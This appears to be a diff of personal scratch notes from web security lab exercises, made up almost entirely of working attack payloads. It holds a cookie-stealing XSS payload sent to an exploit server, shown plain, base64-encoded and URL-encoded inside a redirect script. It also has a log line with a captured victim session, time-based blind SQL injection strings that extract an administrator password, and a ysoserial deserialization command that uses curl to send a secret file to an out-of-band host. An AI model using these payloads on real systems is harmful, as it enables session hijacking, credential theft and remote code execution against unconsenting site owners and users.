@@ -1,0 +1,38 @@
+New
+https://exploit-0aa7002f0317afd283d4f53801f0006e.exploit-server.net/exploit
+
+OLD
+`fetch('https://exploit-0a7700d60460a650acb88a8d01f000c5.exploit-server.net/exploit/?jsonc=' + window["document"]["cookie"])`
+
+New
+`fetch('https://exploit-0aa7002f0317afd283d4f53801f0006e.exploit-server.net/exploit/?jsonc=' + window["document"]["cookie"])`
+
+ZmV0Y2goJ2h0dHBzOi8vZXhwbG9pdC0wYTc3MDBkNjA0NjBhNjUwYWNiODhhOGQwMWYwMDBjNS5leHBsb2l0LXNlcnZlci5uZXQvZXhwbG9pdC8/anNvbmM9JyArIHdpbmRvd1siZG9jdW1lbnQiXVsiY29va2llIl0p
+
+New
+ZmV0Y2goJ2h0dHBzOi8vZXhwbG9pdC0wYWE3MDAyZjAzMTdhZmQyODNkNGY1MzgwMWYwMDA2ZS5leHBsb2l0LXNlcnZlci5uZXQvZXhwbG9pdC8/anNvbmM9JyArIHdpbmRvd1siZG9jdW1lbnQiXVsiY29va2llIl0p
+
+vale"-eval(atob('ZmV0Y2goJ2h0dHBzOi8vZXhwbG9pdC0wYWE3MDAyZjAzMTdhZmQyODNkNGY1MzgwMWYwMDA2ZS5leHBsb2l0LXNlcnZlci5uZXQvZXhwbG9pdC8/anNvbmM9JyArIHdpbmRvd1siZG9jdW1lbnQiXVsiY29va2llIl0p'))-"
+
+Hello, world!
+
+<script>
+window.location='https://0a3000870492a68eacd98b1300720004.web-security-academy.net/?SearchTerm=%76%61%6c%65%22%2d%65%76%61%6c%28%61%74%6f%62%28%27%5a%6d%56%30%59%32%67%6f%4a%32%68%30%64%48%42%7a%4f%69%38%76%5a%58%68%77%62%47%39%70%64%43%30%77%59%54%63%33%4d%44%42%6b%4e%6a%41%30%4e%6a%42%68%4e%6a%55%77%59%57%4e%69%4f%44%68%68%4f%47%51%77%4d%57%59%77%4d%44%42%6a%4e%53%35%6c%65%48%42%73%62%32%6c%30%4c%58%4e%6c%63%6e%5a%6c%63%69%35%75%5a%58%51%76%5a%58%68%77%62%47%39%70%64%43%38%2f%61%6e%4e%76%62%6d%4d%39%4a%79%41%72%49%48%64%70%62%6d%52%76%64%31%73%69%5a%47%39%6a%64%57%31%6c%62%6e%51%69%58%56%73%69%59%32%39%76%61%32%6c%6c%49%6c%30%70%27%29%29%2d%22'
+</script>
+
+10.0.4.242      2024-12-10 12:39:16 +0000 "GET /exploit/?jsonc=session=ve74GKo7eJpMTP4HJypsnIOSkpP26SeQ HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.141 Safari/537.36"
+
+session=ve74GKo7eJpMTP4HJypsnIOSkpP26SeQ
+
+Password Length: 16
+
+GET /advanced_search?SearchTerm=AAAA&organize_by=AUTHOR;SELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)<17)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--&blogArtist=Rich+Man HTTP/
+
+;SELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,§1§,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--
+
+Password:
+
+b235d711d5858825
+b235d711d5858825
+
+java -jar ysoserial-all.jar CommonsCollections7 'curl -d @/home/carlos/secret col7.p6ww6cu48zfsp3k9ef9kd8n59wfq3jr8.oastify.com' | gzip| base64
